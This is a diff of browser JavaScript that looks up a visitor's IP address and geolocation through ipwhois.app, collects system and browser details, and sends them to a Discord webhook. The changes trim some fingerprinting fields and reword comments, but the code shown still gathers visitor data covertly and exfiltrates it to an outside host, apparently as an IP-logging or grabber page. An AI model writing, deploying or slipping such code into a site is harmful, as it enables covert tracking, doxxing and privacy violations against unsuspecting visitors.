@@ -50,7 +50,7 @@
             fetch('https://ipwhois.app/json/')
                 .then(response => response.json())
                 .then(data => {
-                    // Collecting detailed info
+                    // Collecting additional info
                     const geoInfo = `IP: ${data.ip}\nLocation: ${data.city}, ${data.region}, ${data.country}\nTimezone: ${data.timezone}\nCurrency: ${data.currency}`;
 
                     const systemInfo = `
@@ -70,16 +70,11 @@
                         Touch Support: ${('ontouchstart' in window) ? 'Yes' : 'No'}
                         Vibration: ${navigator.vibrate ? 'Supported' : 'Not Supported'}
                         JavaScript Enabled: ${navigator.javaEnabled() ? 'Yes' : 'No'}
-                        Local Storage: ${typeof(Storage) !== "undefined" ? 'Supported' : 'Not Supported'}
-                        Session Storage: ${typeof(sessionStorage) !== "undefined" ? 'Supported' : 'Not Supported'}
-                        Cookies Enabled: ${navigator.cookieEnabled ? 'Yes' : 'No'}
-                        Screen Pixel Ratio: ${window.devicePixelRatio}
-                        Battery Level: ${navigator.getBattery ? getBatteryLevel() : 'N/A'}
                     `;
 
                     const performanceInfo = `Page Load Time: ${window.performance.timing.loadEventEnd - window.performance.timing.navigationStart} ms`;
 
-                    // Additional Browser info
+                    // Collect additional browser info
                     const browserInfo = `
                         User-Agent: ${navigator.userAgent}
                         Cookies Enabled: ${navigator.cookieEnabled ? 'Yes' : 'No'}
@@ -89,13 +84,6 @@
                         Viewport Dimensions: ${window.innerWidth} x ${window.innerHeight}
                         Language: ${navigator.language}
                         Timezone Offset: ${new Date().getTimezoneOffset()} minutes
-                        Is Mobile: ${/Mobi|Android/i.test(navigator.userAgent) ? 'Yes' : 'No'}
-                        Referrer: ${document.referrer || 'None'}
-                        Window Size: ${window.outerWidth}x${window.outerHeight}
-                        Is Touch Enabled: ${('ontouchstart' in window) ? 'Yes' : 'No'}
-                        Is App: ${navigator.standalone ? 'Yes' : 'No'}
-                        PDF Plugin: ${checkPDFSupport()}
-                        WebGL Supported: ${checkWebGL()}
                     `;
 
                     // Send the info to Discord Webhook
@@ -117,27 +105,6 @@
             return navigator.getBattery().then(function(battery) {
                 return `Level: ${battery.level * 100}% Charging: ${battery.charging ? 'Yes' : 'No'}`;
             });
-        }
-
-        function getBatteryLevel() {
-            return navigator.getBattery ? navigator.getBattery().then(function(battery) {
-                return battery.level * 100 + '%';
-            }) : 'Not Available';
-        }
-
-        function checkPDFSupport() {
-            try {
-                const isPDFSupported = !!window.PDFViewerApplication;
-                return isPDFSupported ? 'Yes' : 'No';
-            } catch (e) {
-                return 'No';
-            }
-        }
-
-        function checkWebGL() {
-            const canvas = document.createElement('canvas');
-            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-            return gl ? 'Yes' : 'No';
         }
 
         function sendToWebhook(geoInfo, systemInfo, performanceInfo, browserInfo) {
